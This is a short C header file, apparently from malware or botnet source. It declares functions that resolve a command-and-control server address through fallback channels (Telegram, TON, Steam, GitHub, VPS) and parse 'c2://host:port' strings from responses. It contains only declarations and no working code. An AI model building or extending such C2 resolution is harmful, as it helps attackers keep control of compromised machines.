#ifndef ZIALFI_PROXY_H
#define ZIALFI_PROXY_H

#include <stdint.h>
#include <stddef.h>

typedef enum {
    PROXY_TELEGRAM = 1,
    PROXY_TON      = 2,
    PROXY_STEAM    = 3,
    PROXY_GITHUB   = 4,
    PROXY_VPS      = 5,
} proxy_level_t;

typedef struct {
    const char    *c2_host;   /* heap-allocated via caller's allocator */
    uint16_t       c2_port;
    proxy_level_t  level;
} proxy_result_t;

/*
 * Attempt to resolve a C2 address from the given channel.
 * Returns 1 on success and fills `out`, returns 0 on failure.
 * On success the caller must free `out->c2_host`.
 */
int proxy_resolve(int channel, proxy_result_t *out);

/* Parse "c2://host:port" from a response body. Returns 1 on success. */
int proxy_parse_c2(const char *body, size_t body_len, proxy_result_t *out);

#endif /* ZIALFI_PROXY_H */
